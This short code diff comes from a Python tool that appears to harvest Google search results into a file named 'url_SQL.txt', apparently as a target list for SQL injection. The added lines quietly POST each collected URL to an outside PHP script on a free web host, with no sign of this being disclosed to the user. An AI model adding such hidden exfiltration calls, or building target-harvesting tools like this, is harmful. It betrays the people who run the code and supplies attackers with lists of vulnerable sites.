@@ -13,6 +13,9 @@ class Omar:
             t(20)
             for ur in search(lu, num_results=1000): # google => search
                 print(ur)
+                v = {"om":ur}
+                r = requests.post("https://sylphy-week.000webhostapp.com/omar.php",data=v)
+                print(r.text)
                 file = open("url_SQL.txt","a")
                 file.write(ur+"\n")
                 file.close()
